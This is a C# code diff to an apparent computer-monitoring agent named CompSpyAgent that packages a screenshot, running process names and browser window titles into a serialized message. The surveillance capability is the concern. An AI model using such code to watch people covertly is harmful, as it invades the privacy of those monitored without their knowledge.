@@ -9,6 +9,8 @@ using System.Diagnostics;
 using System.Threading;
 using System.IO;
 using System.Windows;
+using System.Web;
+using System.Runtime.Serialization;
 using NDde.Client;
 
 namespace CompSpyAgent
@@ -23,7 +25,61 @@ namespace CompSpyAgent
         public bool automatycznie;
         public int czasAutomatycznie;
         public DateTime czasOst;
-        
+
+
+        [DataContract] 
+        public class Komunikat
+        {
+            [DataMember]
+            public String image { get; set; }
+
+            [DataMember]
+            public List<String> listaProcesow { get; set; }
+            
+            [DataMember]
+            public List<String> listaStron { get; set; }
+
+            public Komunikat(String img, Process[] procesy, List<String> strony)
+            {
+                image = img;
+
+                listaProcesow = new List<String>();
+                listaStron = new List<String>();
+
+                foreach (var p in procesy)
+                {
+                    listaProcesow.Add(p.ProcessName);
+                }
+
+                foreach(var s in strony)
+                {
+                    listaStron.Add(s);
+                }
+
+            }
+
+        }
+
+        public String serializacja(bool hq)
+        {
+            Komunikat komunikat;
+            if(hq == true)
+            {
+                komunikat = new Komunikat(getImageBase64(getHQScreen()), listaProcesow, listaStron);
+            }
+            else
+            {
+                komunikat = new Komunikat(getImageBase64(getLQScreen()), listaProcesow, listaStron);
+            }
+            var serializer = new DataContractSerializer(komunikat.GetType());
+            var stream = new MemoryStream();
+            serializer.WriteObject(stream, komunikat);
+            stream.Seek(0, SeekOrigin.Begin);
+
+            return (Encoding.ASCII.GetString(stream.GetBuffer()).Replace("\0", ""));
+
+        }
+
             public Spy()
         {
             bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, System.Drawing.Imaging.PixelFormat.Format32bppRgb);
@@ -42,10 +98,32 @@ namespace CompSpyAgent
             }
             );
             watek.Start();
-
         }     
 
+        public void odswiezWysylanyString(bool hq)
+        {
+            String temp;
+            if(hq == true)
+            {
+                temp = getImageBase64(getHQScreen());
+            }
+            else
+            {
+                temp = getImageBase64(getLQScreen());
+            }
 
+            temp += "@";
+            foreach(var p in listaProcesow)
+            {
+                temp += p.ToString() + "#";
+            }
+
+            temp += "@";
+            foreach(var p in listaStron)
+            {
+                temp += p.ToString() + "#";
+            }
+        }
         
         public void Aktualizacja()
         {
@@ -83,7 +161,7 @@ namespace CompSpyAgent
                 if (Convert.ToString(p.ProcessName) == "iexplore")
                 {
                     if (p.MainWindowTitle != "" || p.MainWindowTitle == " ")
-                    {
+                    { 
                         listaStron.Add("[iexplore]");
                         listaStron.Add("Title: " + p.MainWindowTitle);
                     }
@@ -145,11 +223,15 @@ namespace CompSpyAgent
         }
         public String getImageBase64(Bitmap img)
         {
-            using (System.Drawing.Image img2 = img)
+            using (System.Drawing.Image image = img)
             {
                 using (MemoryStream m = new MemoryStream())
                 {
-                    img2.Save(m, img.RawFormat);
+                    try
+                    {
+                        image.Save(m, image.RawFormat);
+                    }
+                    catch { }
                     byte[] bytes = m.ToArray();
                     return Convert.ToBase64String(bytes);
                 }
